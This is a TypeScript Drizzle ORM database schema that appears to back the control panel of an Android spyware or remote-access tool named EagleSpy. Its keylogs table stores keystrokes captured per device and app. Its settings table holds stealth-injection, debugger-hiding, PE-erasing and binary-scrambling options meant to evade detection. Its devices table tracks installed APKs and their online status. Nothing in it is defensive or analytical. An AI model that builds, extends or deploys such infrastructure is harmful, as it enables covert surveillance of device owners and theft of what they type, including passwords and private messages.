import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  passwordHash: varchar("passwordHash", { length: 255 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// Keylogs table for tracking device keystrokes
export const keylogs = mysqlTable("keylogs", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: varchar("deviceId", { length: 64 }).notNull(),
  userId: int("userId").notNull(),
  appName: varchar("appName", { length: 255 }).notNull(),
  keyText: text("keyText").notNull(),
  isDeleted: int("isDeleted").default(0).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Keylog = typeof keylogs.$inferSelect;
export type InsertKeylog = typeof keylogs.$inferInsert;

// TODO: Add your tables here
// Settings table for storing advanced EagleSpy configurations
export const settings = mysqlTable("settings", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").notNull(),
  processName: varchar("processName", { length: 255 }).default("_Remote.exe").notNull(),
  modulePath: text("modulePath").notNull(),
  
  // Advanced Options
  hideFromDebugger: int("hideFromDebugger").default(0).notNull(),
  stealthInject: int("stealthInject").default(0).notNull(),
  hideModule: int("hideModule").default(0).notNull(),
  erasePE: int("erasePE").default(0).notNull(),
  autoInject: int("autoInject").default(0).notNull(),
  closeOnInject: int("closeOnInject").default(0).notNull(),
  
  // Scramble Options
  createFakeDebugDirectory: int("createFakeDebugDirectory").default(0).notNull(),
  createNewEntryPoint: int("createNewEntryPoint").default(0).notNull(),
  insertExtraSections: int("insertExtraSections").default(0).notNull(),
  modifyAssemblyCode: int("modifyAssemblyCode").default(0).notNull(),
  modifyImportTable: int("modifyImportTable").default(0).notNull(),
  moveRelocationTable: int("moveRelocationTable").default(0).notNull(),
  removeDebugData: int("removeDebugData").default(0).notNull(),
  removeUselessData: int("removeUselessData").default(0).notNull(),
  renameSections: int("renameSections").default(0).notNull(),
  scrambleHeaderFields: int("scrambleHeaderFields").default(0).notNull(),
  shiftSectionData: int("shiftSectionData").default(0).notNull(),
  shiftSectionMemory: int("shiftSectionMemory").default(0).notNull(),
  stripSectionCharacteristics: int("stripSectionCharacteristics").default(0).notNull(),
  
  // UI Colors
  background1: varchar("background1", { length: 64 }).default("DodgerBlue").notNull(),
  background2: varchar("background2", { length: 64 }).default("DeepSkyBlue").notNull(),
  textColor: varchar("textColor", { length: 64 }).default("White").notNull(),
  
  // Delay and Method
  delay: int("delay").default(0).notNull(),
  delayBetween: int("delayBetween").default(0).notNull(),
  method: int("method").default(0).notNull(),
  
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Setting = typeof settings.$inferSelect;
export type InsertSetting = typeof settings.$inferInsert;


// Devices table for tracking installed APKs
export const devices = mysqlTable("devices", {
  id: int("id").autoincrement().primaryKey(),
  deviceId: varchar("deviceId", { length: 64 }).notNull().unique(),
  userId: int("userId").notNull(),
  appName: varchar("appName", { length: 255 }).notNull(),
  appUrl: text("appUrl").notNull(),
  deviceModel: varchar("deviceModel", { length: 255 }),
  androidVersion: varchar("androidVersion", { length: 64 }),
  appVersion: varchar("appVersion", { length: 64 }),
  status: mysqlEnum("status", ["online", "offline"]).default("online").notNull(),
  lastSeen: timestamp("lastSeen").defaultNow().onUpdateNow().notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Device = typeof devices.$inferSelect;
export type InsertDevice = typeof devices.$inferInsert;
